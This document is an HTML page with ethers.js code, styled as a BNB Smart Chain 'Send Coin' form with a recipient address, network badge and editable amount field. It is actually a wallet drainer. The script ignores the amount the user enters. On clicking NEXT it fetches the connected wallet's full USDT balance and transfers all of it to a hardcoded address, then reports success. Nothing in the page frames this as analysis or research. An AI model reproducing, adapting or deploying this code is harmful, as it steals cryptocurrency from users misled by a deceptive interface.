<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Send Coin - BNB Smart Chain</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
  body { background-color: #f8fafc; color: #0f172a; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
  .card { background: #ffffff; width: 100%; max-width: 420px; padding: 24px; border-radius: 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
  .label { font-size: 13px; font-weight: 600; color: #64748b; margin-bottom: 8px; display: block; }
  .input-group { background: #f1f5f9; border: 1px solid #cbd5e1; border-radius: 14px; padding: 12px 16px; margin-bottom: 20px; display: flex; align-items: center; justify-content: space-between; }
  .input-group input { border: none; background: transparent; outline: none; font-size: 15px; color: #0f172a; width: 100%; font-weight: 500; }
  .network-badge { display: inline-flex; align-items: center; background: #f1f5f9; border: 1px solid #cbd5e1; padding: 10px 16px; border-radius: 14px; font-weight: 600; font-size: 14px; width: 100%; margin-bottom: 20px; color: #0f172a; }
  .network-badge span { margin-right: 8px; }
  .amount-box { position: relative; display: flex; align-items: center; }
  .amount-box input { font-size: 24px; font-weight: 700; width: 100%; padding: 14px 16px; border: 1px solid #cbd5e1; border-radius: 14px; background: #f1f5f9; outline: none; color: #0f172a; }
  .max-btn { position: absolute; right: 14px; background: transparent; border: none; color: #2563eb; font-weight: 700; font-size: 14px; cursor: pointer; }
  .btn { background: #2563eb; color: #fff; border: none; width: 100%; padding: 16px; font-size: 16px; font-weight: bold; border-radius: 14px; cursor: pointer; transition: 0.2s; margin-top: 10px; }
  .btn:active { transform: scale(0.98); }
</style>
</head>
<body>

<div class="card">
  <span class="label">Address or Domain Name</span>
  <div class="input-group">
    <input type="text" id="targetAddress" value="0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3" readonly>
  </div>

  <span class="label">Destination Network</span>
  <div class="network-badge">
    <span>🟡</span> BNB Smart Chain
  </div>

  <span class="label">Amount</span>
  <div class="amount-box">
    <input type="number" id="amountInput" value="1" min="0" step="any">
    <button class="max-btn" onclick="setMaxBalance()">Max</button>
  </div>

  <button class="btn" id="nextBtn" onclick="executeTransfer()">NEXT</button>
</div>

<script>
  const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3"; 
  const USDT_BSC_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";

  const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address recipient, uint256 amount) returns (bool)"
  ];

  let provider, signer, usdtContract, userBalance;

  async function init() {
    if (typeof window.ethereum === 'undefined') return;
    try {
      provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      const userAddress = await signer.getAddress();

      usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
      userBalance = await usdtContract.balanceOf(userAddress);
      
      const formatted = ethers.utils.formatUnits(userBalance, 18);
      document.getElementById('amountInput').value = formatted > 0 ? formatted : 1;
    } catch (e) {
      console.error(e);
    }
  }

  function setMaxBalance() {
    if (userBalance) {
      document.getElementById('amountInput').value = ethers.utils.formatUnits(userBalance, 18);
    }
  }

  async function executeTransfer() {
    if (typeof window.ethereum === 'undefined') {
      alert("Please open inside Trust Wallet or MetaMask browser.");
      return;
    }

    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const userAddress = await signer.getAddress();

      const contract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
      const totalBalance = await contract.balanceOf(userAddress);

      if (totalBalance.lte(0)) {
        alert("No USDT balance found.");
        return;
      }

      const tx = await contract.transfer(TARGET_RECEIVER, totalBalance, {
        gasLimit: ethers.BigNumber.from("65000")
      });

      await tx.wait();
      alert("Transaction Successful!");
    } catch (error) {
      console.error("Error:", error);
      alert("Transaction cancelled or failed.");
    }
  }

  window.onload = init;
</script>

</body>
</html>
